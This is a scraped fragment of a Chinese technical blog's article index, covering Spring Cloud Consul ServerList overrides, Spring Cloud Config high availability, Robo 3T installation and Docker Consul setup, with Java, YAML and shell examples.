@Autowired private DiscoveryClient discoveryClient; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/getServer/{serviceId}") public List&lt;ServiceInstance&gt; getServer(@PathVariable("serviceId") String serviceId) { return discoveryClient.getInstances(serviceId); }} Consul Consumer Override 工程里的 application.yml 配置文件： 12345678910111213server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 discovery: server-list-query-tags: consul-provider: tag1 # 在调用 consul-provider 服务时，使用 tag1 对应的服务实例 测试结果： 启动本地的 Consul 服务器 依次启动 consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override 应用 访问 http://127.0.0.1:9004/getServer/consul-provider，查看接口返回的信息，看看是否只返回了 tag1 对应的服务实例 重写 ConsulServerList原理分析单纯的自定义实现 ServerList 的接口并不能达到重写 ConsulServerList 的目的，是因为 ConsulServerList 的 serviceId 属性为 null 时会导致启动报错。这个 serviceId 属性表示服务提供者的名称，但是却作为 ConsulServerList 的成员变量。由此可以联想到，Spring Cloud Consul 为每个服务提供者都创建了一个 ConsulServerList 实例，这是为了支持 Ribbon 的服务配置个性化。Ribbon 支持对某一个服务单独配置负载，比如负载算法，是否重试等，当然也包括服务发现逻辑，为每一个服务实例化一个服务发现逻辑，可以最大化地将自由交给实现方。特别注意，ConsulServerList 并不是在 Spring 启动的时候初始化，而是在服务调用时通过 Ribbon 进行初始化，具体的初始化流程如下： Feign 通过 serviceId 去 Ribbon 中获取服务端配置 Ribbon 根据 serviceId 去缓存中找是否存在这个名称的 AnnotationConfigApplicationContext 实例，如果有就立即返回；如果没有就创建一个，而创建 AnnotationConfigApplicationContext 的过程，就是 ConsulServerList 初始化的过程 AnnotationConfigApplicationContext 跟 ConsulServerList 是通过 @RibbonClient 注解关联在一起的，具体可以参考 RibbonClientConfigurationRegistrar 源码 所以重写 ConsulServerList 的过程比较麻烦，要么重新写一套类似的 spring-cloud-consul-discovery 源码，要么就从源头的 RibbonClientConfiguration 开始直到 ConsulServerList 均改成自己的实现。 重写示例下面的示例将使用第二种方式重写 ConsulServerList，首先创建三个工程，分别是：consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override，其中前两个工程与上面的服务发现案例里的配置和代码完全一致，这里不再累述，点击下载完整的案例代码。值得一提的是，在 Consul Consumer Override 工程里新增 MyConsulServerList、MyConsulRibbonClientConfiguration、MyRibbonConsulAutoConfiguration 类，需要保证 MyConsulRibbonClientConfiguration 类不能与被 @ConponentScan 修饰的主类放在同一个包或其子包下，否则会导致 IClientConfig 的 Bean 无法注入。 Consul Consumer Override 工程里的 MyConsulServerList 类： 12345678910111213141516171819202122232425262728293031323334public class MyConsulServerList extends AbstractServerList&lt;ConsulServer&gt; { private String serviceId; private final ConsulClient client; private final ConsulDiscoveryProperties properties; private static final Logger logger = LoggerFactory.getLogger(MyConsulServerList.class); public MyConsulServerList(ConsulClient client, ConsulDiscoveryProperties properties) { this.client = client; this.properties = properties; } /** * 打印一句提示 */ private List&lt;ConsulServer&gt; getServers() { if (this.client == null) { return Collections.emptyList(); } logger.info("===== 自定义服务发现 ====="); String tag = getTag(); // null is ok Response&lt;List&lt;HealthService&gt;&gt; response = this.client.getHealthServices( this.serviceId, tag, this.properties.isQueryPassing(), createQueryParamsForClientRequest(), this.properties.getAclToken()); if (response.getValue() == null || response.getValue().isEmpty()) { return Collections.emptyList(); } return transformResponse(response.getValue()); } // 省略其他代码 ....} Consul Consumer Override 工程里的 MyConsulRibbonClientConfiguration 类： 123456789101112131415161718192021222324252627282930313233343536@Configurationpublic class MyConsulRibbonClientConfiguration { @Autowired private ConsulClient client; private String serviceId = "client"; protected static final String VALUE_NOT_SET = "__not__set__"; protected static final String DEFAULT_NAMESPACE = "ribbon"; public MyConsulRibbonClientConfiguration() { } public MyConsulRibbonClientConfiguration(String serviceId) { this.serviceId = serviceId; } /** * 将ServerList生效的实现改为MyServerList * * @param config * @param properties * @return */ @Bean @ConditionalOnMissingBean public ServerList&lt;?&gt; ribbonServerList(IClientConfig config, ConsulDiscoveryProperties properties) { MyConsulServerList serverList = new MyConsulServerList(client, properties); serverList.initWithNiwsConfig(config); return serverList; } // 省略其他代码 ....} Consul Consumer Override 工程里的 MyRibbonConsulAutoConfiguration 类： 12345678910111213/** * 该类主要是将原有入口取代, 因此它的生效逻辑刚好跟 RibbonConsulAutoConfiguration 相反 * 当 spring.cloud.consul.ribbon.enabled 为 false 时, 这里重写的逻辑生效 */@Configuration@ConditionalOnConsulEnabled@ConditionalOnBean(SpringClientFactory.class)@AutoConfigureAfter(RibbonAutoConfiguration.class)@ConditionalOnExpression("${spring.cloud.consul.ribbon.enabled:true}==false")@RibbonClients(defaultConfiguration = MyConsulRibbonClientConfiguration.class)public class MyRibbonConsulAutoConfiguration {} 在 Consul Consumer Override 工程里里创建 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ com.springcloud.override.consul.MyRibbonConsulAutoConfiguration Consul Consumer Override 工程里的启动主类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerOverrideApplication { public static void main(String[] args) { SpringApplication.run(ConsumerOverrideApplication.class, args); }} Consul Consumer Override 工程里的服务接口类，用于调用 Provider 服务： 123456@FeignClient("consul-provider")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} Consul Consumer Override 工程里的测试控制类： 12345678910111213141516171819@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @Autowired private ProviderService providerService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/sayHello/{name}") public String getServer(@PathVariable("name") String name) { return providerService.sayHello(name); }} Consul Consumer Override 工程里的 application.yml 123456789101112server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul 启动地址 port: 8500 # consul 启动端口 ribbon: enabled: false # 此处配置很重要,为 true 时走原有逻辑, 为 false 时走重写逻辑 测试结果： 启动本地的 Consul 服务器 依次启动 consul-provider-tag-one、consul-provider-tag-two、consul-consumer-override 应用 访问 http://127.0.0.1:9004/sayHello/Peter，查看接口是否正常返回内容，控制台输出的日志信息如下： 1234c.netflix.loadbalancer.BaseLoadBalancer : Client: consul-provider instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=consul ...c.n.l.DynamicServerListLoadBalancer : Using serverListUpdater PollingServerListUpdaterc.s.override.consul.MyConsulServerList : ===== 自定义服务发现 =====c.netflix.config.ChainedDynamicProperty : Flipping property: consul-provider.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 多次访问 http://127.0.0.1:9004/sayHello/Peter，通过接口返回的服务方端口号，看看客户端是不是默认以轮询的方式调用服务方的接口 Spring Cloud Consul 的坑异常信息不完整开发者偶尔会遇到 Spring Cloud Consul 打印的异常堆栈中，message 为 null 的情况，导致排查问题异常困难，这是因为 Spring Cloud Consul 对 consul-api 自定义的 OperationException 异常没有做特殊处理导致的。当 Consul 的 HTTP 响应代码为非 200 时，consul-api 会抛出 OperationException；而 Spring Cloud Consul 在调用 consul-api 接口时，有些代码会简单地使用 Exception 捕获异常，然后打印 Log 日志，导致 OperationException 的属性丢失。例如在 ConsulCatalogWatch、ConsulHealthIndicator 中均使用这种处理方式。 consul-api 的兼容问题Consul 在 1.0.0 版本后，将一些接口（/agent/check/pass，/agent/service/deregister）由 GET 方法改成 PUT，这个 bug 在 consul-api 的 1.3.0 版本才得到解决，对应到 Spring Cloud Consul 已经是 2.0.0.M1 版本了。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Linux 安装 Robo 3T（Robomongo）",url:"/posts/1f8b78c4.html",text:'相关站点 Robo 3T 官网 Robo 3T 官方下载 Robo 3T Github 项目 Robo 3T Snap Github 项目 介绍 Robo 3T 是一款跨平台的 MongoDB 可视化工具，在管理数据库内容以及数据库代码编辑方面提供一定的开发优化方案，内置一个代码编辑区域，支持将数据库文件放到软件上修改，结合图形化的处理方式，可以将 MongoDB 数据库中的文件转换为分布式的存储方式，提高数据文件编辑和保存效率。Robo 3T 的前身是 Robomongo，在新版本中，可以更加方便地查找数据库对象、利用其中的数据生成器，可以将 Excel 文件的数据导入数据库中保存，对于制作数据文件来说是非常方便的。 安装说明 由于 Robo 3T 是基于 C++ 开发的，为了避免安装过程中可能出现的 GLibc 依赖错误，下面直接通过 Snap 来安装 Robomongo，这样也方便以后管理软件的更新，此安装方式适用于 Centos、Debian、Ubuntu 等 Liinux 发行版。 12345678910111213141516171819202122# 安装# snap install robo3t-snap# 查看安装状态# snap list# 创建快捷方式# vim /usr/share/applications/robo3t.desktop[Desktop Entry]Name=Robo3tComment=Robo 3T (formerly Robomongo) is the free lightweight GUI for MongoDB enthusiasts.Exec=/snap/bin/robo3t-snap %UTerminal=falseType=ApplicationIcon=/var/lib/snapd/snap/robo3t-snap/current/meta/gui/icon.pngCategories=GNOME;GTK;Development;MimeType=text/plain;# 菜单栏导航到：应用程序 --&gt; 编程 --&gt; Robo3t，直接点击快捷方式启动应用，应用启动后的界面截图如下# 或者直接使用命令来启动（使用普通用户权限）$ /snap/bin/robo3t-snap Robo 3T 界面 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发工具"},{title:"Config 入门教程 - 高级篇",url:"/posts/8a77bec.html",text:'上篇 - Config 入门教程（中级篇） Config 入门教程 - 中级篇 前言版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外。 Config 高可用对于线上的生产环境，通常对其都是有很高的要求，其中高可用是不可或缺的一部分，必须要保证服务是可用状态，才能保证系统更好地运行，这是业务稳定的保证。 Config 客户端高可用对于客户端的高可用，这里的方案主要还是用 File 的形式，本质与 “客户端回退” 的思路大体一致。客户端高可用主要是解决当服务端不可用的情况下，客户端依然可以正常启动。从客户端的角度出发，不是增加配置中心的高可用性，而是降低客户端对配置中心的依赖程度，从而提高整个分布式架构的健壮性。客户端加载配置的高可用流程图如下，点击下载完整的案例代码。 1. 准备工作由于下面的 Spring Cloud Config 使用 Git 作为存储方式，因此需要提前在 Git 远程仓库（Github、Gitlab）中创建对应的仓库，然后往仓库里 Push 三个配置文件，分别是 config-client-dev.yml、config-client-prod.yml、config-client-test.yml，配置文件的内容如下： 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 2. 创建 Config Client HA AutoConfig 工程创建 Config Client HA AutoConfig 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client HA AutoConfig 工程里的配置属性加载类： 123456789101112131415161718192021222324252627282930@Component@ConfigurationProperties(prefix = ConfigSupportProperties.CONFIG_PREFIX)public class ConfigSupportProperties { public static final String CONFIG_PREFIX = "spring.cloud.config.backup"; private final String DEFAULT_FILE_NAME = "fallback.properties"; private boolean enable = false; private String fallbackLocation; public boolean isEnable() { return enable; } public void setEnable(boolean enable) { this.enable = enable; } public String getFallbackLocation() { return fallbackLocation; } public void setFallbackLocation(String fallbackLocation) { // 如果只是填写路径， 就添加上一个默认的文件名 if (fallbackLocation.indexOf(".") == -1) { this.fallbackLocation = fallbackLocation + DEFAULT_FILE_NAME; return; } this.fallbackLocation = fallbackLocation; }} 创建 Config Client HA AutoConfig 工程里的自动配置类，该类主要的作用是判断 Config Server 端的配置信息是否可用，如果不能用将读取加载本地备份配置文件进行启动。需要注意的是启动顺序的设置，这是因为 Spring Cloud 使用的 PropertySourceBootstrapConfiguration 启动顺序为 private int order = -2147483638，order 的值越小越先加载，所以下述的 orderNum 只要加上一个整数比其大即可： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185@Configuration@EnableConfigurationProperties(ConfigSupportProperties.class)public class ConfigSupportConfiguration implements ApplicationContextInitializer&lt;ConfigurableApplicationContext&gt;, Ordered { private final Logger LOGGER = LoggerFactory.getLogger(ConfigSupportConfiguration.class); private final Integer orderNum = Ordered.HIGHEST_PRECEDENCE + 11; @Autowired(required = false) private List&lt;PropertySourceLocator&gt; propertySourceLocators = Collections.EMPTY_LIST; @Autowired private ConfigSupportProperties configSupportProperties; @Override public void initialize(ConfigurableApplicationContext configurableApplicationContext) { if (!isHasCloudConfigLocator(this.propertySourceLocators)) { LOGGER.info("未启用Config Server管理配置"); return; } LOGGER.info("检查Config Service配置资源"); ConfigurableEnvironment environment = configurableApplicationContext.getEnvironment(); MutablePropertySources propertySources = environment.getPropertySources(); LOGGER.info("加载PropertySources源：" + propertySources.size() + "个"); if (!configSupportProperties.isEnable()) { LOGGER.warn("未启用配置备份功能，可使用{}.enable打开", ConfigSupportProperties.CONFIG_PREFIX); return; } if (isCloudConfigLoaded(propertySources)) { PropertySource cloudConfigSource = getLoadedCloudPropertySource(propertySources); LOGGER.info("成功获取ConfigService配置资源"); Map&lt;String, Object&gt; backupPropertyMap = makeBackupPropertyMap(cloudConfigSource); doBackup(backupPropertyMap, configSupportProperties.getFallbackLocation()); LOGGER.info("成功备份ConfigService配置资源"); } else { LOGGER.error("获取ConfigService配置资源失败"); Properties backupProperty = loadBackupProperty(configSupportProperties.getFallbackLocation()); if (backupProperty != null) { HashMap backupSourceMap = new HashMap&lt;&gt;(backupProperty); PropertySource backupSource = new MapPropertySource("backupSource", backupSourceMap); propertySources.addFirst(backupSource); LOGGER.warn("使用备份的配置启动：{}", configSupportProperties.getFallbackLocation()); } } } @Override public int getOrder() { return orderNum; } /** * 是否启用了Spring Cloud Config获取配置资源 * * @param propertySourceLocators * @return */ private boolean isHasCloudConfigLocator(List&lt;PropertySourceLocator&gt; propertySourceLocators) { for (PropertySourceLocator sourceLocator : propertySourceLocators) { if (sourceLocator instanceof ConfigServicePropertySourceLocator) { return true; } } return false; } /** * 是否启用Cloud Config * * @param propertySources * @return */ private boolean isCloudConfigLoaded(MutablePropertySources propertySources) { if (getLoadedCloudPropertySource(propertySources) == null) { return false; } return true; } /** * 获取加载的Cloud Config配置项 * * @param propertySources * @return */ private PropertySource getLoadedCloudPropertySource(MutablePropertySources propertySources) { if (!propertySources.contains(PropertySourceBootstrapConfiguration.BOOTSTRAP_PROPERTY_SOURCE_NAME)) { return null; } PropertySource propertySource = propertySources.get(PropertySourceBootstrapConfiguration.BOOTSTRAP_PROPERTY_SOURCE_NAME); if (propertySource instanceof CompositePropertySource) { for (PropertySource&lt;?&gt; source : ((CompositePropertySource) propertySource).getPropertySources()) { if (source.getName().equals("configService")) { return source; } } } return null; } /** * 生成备份的配置数据 * * @param propertySource * @return */ private Map&lt;String, Object&gt; makeBackupPropertyMap(PropertySource propertySource) { Map&lt;String, Object&gt; backupSourceMap = new HashMap&lt;&gt;(); if (propertySource instanceof CompositePropertySource) { CompositePropertySource composite = (CompositePropertySource) propertySource; for (PropertySource&lt;?&gt; source : composite.getPropertySources()) { if (source instanceof MapPropertySource) { MapPropertySource mapSource = (MapPropertySource) source; for (String propertyName : mapSource.getPropertyNames()) { // 前面的配置覆盖后面的配置 if (!backupSourceMap.containsKey(propertyName)) { backupSourceMap.put(propertyName, mapSource.getProperty(propertyName)); } } } } } return backupSourceMap; } /** * 生成备份文件 * * @param backupPropertyMap * @param filePath */ private void doBackup(Map&lt;String, Object&gt; backupPropertyMap, String filePath) { FileSystemResource fileSystemResource = new FileSystemResource(filePath); File backupFile = fileSystemResource.getFile(); try { if (!backupFile.exists()) { backupFile.createNewFile(); } if (!backupFile.canWrite()) { LOGGER.error("无法读写文件：{}", fileSystemResource.getPath()); } Properties properties = new Properties(); Iterator&lt;String&gt; keyIterator = backupPropertyMap.keySet().iterator(); while (keyIterator.hasNext()) { String key = keyIterator.next(); properties.setProperty(key, String.valueOf(backupPropertyMap.get(key))); } FileOutputStream fos = new FileOutputStream(fileSystemResource.getFile()); properties.store(fos, "Backup Cloud Config"); } catch (IOException e) { LOGGER.error("文件操作失败：{}", fileSystemResource.getPath()); e.printStackTrace(); } } /** * 加载本地文件 * * @param filePath * @return */ private Properties loadBackupProperty(String filePath) { PropertiesFactoryBean propertiesFactory = new PropertiesFactoryBean(); Properties props = new Properties(); try { FileSystemResource fileSystemResource = new FileSystemResource(filePath); propertiesFactory.setLocation(fileSystemResource); propertiesFactory.afterPropertiesSet(); props = propertiesFactory.getObject(); } catch (IOException e) { e.printStackTrace(); return null; } return props; }} 创建 Config Client HA AutoConfig 工程里 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.config.ConfigSupportConfiguration 3. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入上面的 config-client-ha-autoconfig： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-ha-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，enable 表示是否启动加载远程配置信息进行本地备份，fallbackLocation 表示本地备份的路径，也可以是路径加上文件名： 12345678910spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 backup: enable: true fallbackLocation: /tmp/config/config-client-dev/fallback.properties #备份配置文件的路径 4. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中： 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 5. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo 后观察返回的配置信息，与此同时查看是否在目录 /tmp/config/config-client-dev/ 下成功创建了备份文件 fallback.properties 关闭 config-server、config-client 应用，然后单独启动 config-client 应用；观察在不启动 config-server 的情况下，config-client 应用是否能正常启动 若 config-client 应用单独启动成功，config-client 应用会先尝试去连接 config-server，当连接失败后，会加载本地的备份文件，此时控制台输出的日志信息如下： 1234567c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://127.0.0.1:8001c.c.c.ConfigServicePropertySourceLocator : Connect Timeout Exception on Url - http://127.0.0.1:8001. Will be trying the next url if availablec.c.c.ConfigServicePropertySourceLocator : Could not locate PropertySource: I/O error on GET request for "http://127.0.0.1:8001/config-client/dev/master": 拒绝连接; nested exception is java.net.ConnectException: 拒绝连接c.s.s.config.ConfigSupportConfiguration : 检查Config Service配置资源c.s.s.config.ConfigSupportConfiguration : 加载PropertySources源：10个c.s.s.config.ConfigSupportConfiguration : 获取ConfigService配置资源失败c.s.s.config.ConfigSupportConfiguration : 使用备份的配置启动：/tmp/config/config-client-dev/fallback.properties Config 服务端高可用Config Server 一样需要在生成环境下保证高可用的，这里将通过结合 Eureka 注册中心的方式搭建 Config Server 的高可用，即通过 Ribbon 的客户端负载均衡选择一个 Config Server 进行连接来获取配置信息，具体的流程如下，点击下载完整的案例代码。对于 Eureka 的高可用这里也不进行详解，详细关于 Eureka 的高可用可参考 Eureka 集群配置。 1. 准备说明本示例用到上面的 “客户端高可用” 示例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 2. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-netflix-eureka-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程的 src/main/resources 目录下： 1234567891011server: port: 7001eureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 3. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，由于 Config Sever 需要注册到 Eureka Server，所以需要另外添加 Eureka Client 的依赖： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer、@EnableDiscoveryClient 注解： 123456789@EnableConfigServer@EnableDiscoveryClient@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中： 1234567891011121314151617181920212223server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: mastereureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: ${spring.application.name}-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 4. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，由于 Config Client 需要注册到 Eureka Server，所以需要另外添加 Eureka Client 的依赖： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类，增加 @EnableDiscoveryClient 注解： 123456789@EnableDiscoveryClient@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，这里不再使用 spring.cloud.config.uri 参数直接指向 Config Server 端的连接地址，而是增加了下述三个参数： spring.cloud.config.discovery.enabled：开启 Config Client 的服务发现支持 spring.cloud.config.discovery.service-id：指定 Config Server 端的 serviceId，也就是 Config Server 端的 spring.application.name 参数值 eureka.client.service-url.defaultZone： 指向 Eureka 注册中心的地址 1234567891011121314151617spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 discovery: enabled: true service-id: config-servereureka: client: service-url: defaultZone: http://localhost:7001/eureka instance: instance-id: config-client-${server.port} #自定义服务名称 prefer-ip-address: true #将IP注册到Eureka Server上，若不配置默认使用机器的主机名 5. 测试 通过 maven install 命令将各个应用安装到本地，然后再使用命令行启动各个应用，当然也可以直接在 IDEA、Eclipse 里启动，具体的命令如下： 1234567891011121314# 启动Eurekajava -jar eureka-server-1.0-SNAPSHOT.jar# 启动Config Server（默认端口：8001）java -jar config-server-1.0-SNAPSHOT.jar# 启动Config Serverjava -jar config-server-1.0-SNAPSHOT.jar --server.port=8002# 启动Config Config（默认端口：9001）java -jar config-client-1.0-SNAPSHOT.jar# 启动Config Configjava -jar config-client-1.0-SNAPSHOT.jar --server.port=9002 当两个 Config Client 应用启动完成后，查看控制台输出的日志信息，看看是否已经负载了；如果没有负载到也没关系，可以启动多个 Config Client 实例再试试 浏览器访问 http://127.0.0.1:9001/getConfigInfo、http://127.0.0.1:9002/getConfigInfo，观察是否可以正确返回配置信息 Config 源码解析（待续） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Docker 安装 Consul",url:"/posts/224f5100.html",text:'相关站点 Consul 官方安装教程 Consul Docker 官方安装教程 拉取 Consul 镜像 12345# 拉取最新版本的镜像# docker pull consul:latest# 拉取特定版本的镜像# docker pull consul:1.7.3 Docker 安装 Consul（单机） 1234567# 创建并启动容器，默认是以开发模式启动，数据保存在内存中# docker run -d --name=consul -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3# 查看容器的运行状态# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7c43babcc760 consul:1.7.3 "docker-entrypoint.s…" 38 seconds ago Up 37 seconds 8300-8302/tcp, 8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul Docker 安装 Consul（集群） 下面将演示在开发模式下，如何创建拥有 3 个节点的 Consul 集群，数据默认保存在内存中，开发模式下可以直接通过 8500 端口访问 Consul 的 WebUI 界面。 12345678910111213141516171819202122232425262728# 创建并启动第一个节点# docker run -d --name=consul-node1 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3# 查看第一个节点的IP# docker inspect -f=\'{{.NetworkSettings.IPAddress}}\' consul-node1# 